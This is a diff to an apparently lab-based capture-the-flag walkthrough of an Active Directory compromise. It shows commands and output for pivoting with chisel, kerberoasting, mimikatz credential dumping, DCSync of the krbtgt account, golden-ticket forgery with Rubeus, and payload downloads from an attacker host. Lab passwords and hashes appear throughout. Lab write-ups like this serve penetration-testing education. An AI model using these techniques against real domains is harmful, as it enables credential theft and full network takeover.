@@ -8,12 +8,12 @@ Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString "NewP@ssw0
 ```
 Now from the attack box we can login using the following command using winRM:
 ```
-evil-winrm -i 10.129.21.224 -u Administrator -p NewP@ssw0rd!
+evil-winrm -i 10.129.132.177 -u Administrator -p NewP@ssw0rd!
 ```
 
 Spin up an http server on the attack box to download `Rubeus.exe` on the target.
 ```
-wget http://10.10.14.94:8000/Rubeus.exe -OutFile Rubeus.exe -UseBasicParsing
+wget http://10.10.14.145:8000/Rubeus.exe -OutFile Rubeus.exe -UseBasicParsing
 ```
 
 Then to kerberoast execute following commands:
@@ -44,17 +44,157 @@ MSSQLSvc/SQL01.inlanefreight.local:1433:lucky7
 
 Now we want to pivot to box `MS01` with ip address `172.16.6.50`... Let's get `chisel` on the pivot by executing:
 ```
-wget http://10.10.14.94:8000/chisel.exe -OutFile chisel.exe -UseBasicParsing
+wget http://10.10.14.145:8000/chisel.exe -OutFile chisel.exe -UseBasicParsing
 ```
 
 Setup chisel to pivot:
 ```
 #Creates a socks proxy accessible on the attack machine (server) on port 1080
-./chisel server -v -p 1234 --socks5 --reverse #Attack box
-./chisel client -v 10.10.14.94:1234 R:1080:socks #Pivot
+#Attack box
+./chisel server -v -p 1234 --socks5 --reverse 
+#Pivot
+./chisel client -v 10.10.14.145:1234 R:1080:socks 
 ```
 
 Now let's try connecting via rdp from the attack box
 ```
 proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /p:lucky7
 ```
+
+Once logged into the machine let's try an LSAS dump with mimikatz (use the 64bit version, using the 32bit one works but the cleartext password is not shown only the hash):
+
+```
+./mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+```
+The below seemed interesting.. a user `tpetty` seems logged in:
+```
+Authentication Id : 0 ; 258349 (00000000:0003f12d)
+Session           : Interactive from 1
+User Name         : tpetty
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 11/9/2025 1:53:46 AM
+SID               : S-1-5-21-2270287766-1317258649-2146029398-4607
+        msv :
+         [00000003] Primary
+         * Username : tpetty
+         * Domain   : INLANEFREIGHT
+         * NTLM     : fd37b6fec5704cadabb319cebf9e3a3a
+         * SHA1     : 38afea42a5e28220474839558f073979645a1192
+         * DPAPI    : da2ec07551ab1602b7468db08b41e3b2
+        tspkg :
+        wdigest :
+         * Username : tpetty
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : tpetty
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : Sup3rS3cur3D0m@inU2eR
+        ssp :
+        credman :
+```
+
+We can see this user has DCsync privileges. Let's try to take over the domain...
+First let's find the domain controller:
+```
+echo %LOGONSERVER%
+```
+This results in `\\DC01`.. We can ping this DNS name to find the IP address: `172.16.6.3`.
+
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt
+
+We login as the `tpetty` user (after we configured remote access for this user on host `172.16.6.50`).
+We then execute mimikatz to sync the secret keys of the `krbtgt` user:
+```
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 3/30/2022 2:54:28 AM
+Object Security ID   : S-1-5-21-2270287766-1317258649-2146029398-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 6dbd63f4a0e7c8b221d61f265c4a08a7
+    ntlm- 0: 6dbd63f4a0e7c8b221d61f265c4a08a7
+    lm  - 0: 71f5354fb6fbe151714f6721f59011dd
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6fde235c8619e8c5c87e14f2b17552d7
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : INLANEFREIGHT.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 7a2c7787775bdf8b34c52a1d0f387a3d6201752ed30033d178421e7f0d7b1fe8
+      aes128_hmac       (4096) : ea3a44ad8f9b7429f8b878b41b6362ff
+      des_cbc_md5       (4096) : 5485514919f4ce7c
+
+* Primary:Kerberos *
+    Default Salt : INLANEFREIGHT.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 5485514919f4ce7c
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  2bb73bdf286535cca8381b1afb78b82d
+    02  3b04c50704a81e6cc5125379207ffdc2
+    03  2ca377dbfde6edef8e9d2a5c17b71e73
+    04  2bb73bdf286535cca8381b1afb78b82d
+    05  3b04c50704a81e6cc5125379207ffdc2
+    06  937d38336fd33b931ff6f106c54a76a4
+    07  2bb73bdf286535cca8381b1afb78b82d
+    08  7a69e7697b6df4a0040bb36171a0e08e
+    09  cc399ef2a6502a37f9124416f616dfd5
+    10  044537a6bef7c6115fbb5842cd47be4e
+    11  7a69e7697b6df4a0040bb36171a0e08e
+    12  cc399ef2a6502a37f9124416f616dfd5
+    13  f843a1cdec578e2ead903cb9f80073d8
+    14  7a69e7697b6df4a0040bb36171a0e08e
+    15  c3cb5c0aa3ebccfb636861ec22ac237c
+    16  2592019b4fc371efae925414173e3b69
+    17  5be090a16765c728f0b08f9a9a057012
+    18  6d6b885f818a372547456fca4f974b98
+    19  45b5004e455663288b5c6184d192d001
+    20  7bc20dc9ecfc249ecb224fa27bbd85ce
+    21  66406595b499152a9df7614d539e7a2e
+    22  66406595b499152a9df7614d539e7a2e
+    23  06734969c3b71aaee2e401062dfd96c3
+    24  fca233890eccb4232a3f3331d47f1621
+    25  8d45e2dd76d2df2e8be12cbddffb47e2
+    26  21c8885ffb2a003ef6dbcbdcb65217b8
+    27  868395f3f5a7dcc5d2f9ac454ea99d21
+    28  58705a0138014a18c509951e3e53babd
+    29  9ffa2d0920441c7b8ea25cc4ff686f4c
+```
+
+
+Now that we have the hash of the `krbtgt` account we can forge our own tickets to impersonate the Administrator account:
+```
+Rubeus.exe golden /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2270287766-1317258649-2146029398 /aes256:7a2c7787775bdf8b34c52a1d0f387a3d6201752ed30033d178421e7f0d7b1fe8 /ptt
+```
+
+Now that the ticket is imported we can login to the DC01:
+```
+Invoke-PSSession -ComputerName 
+Cd C:/Users/Administrator/Desktop
+cat flag.txt
+```
+We have found the content of the flag!
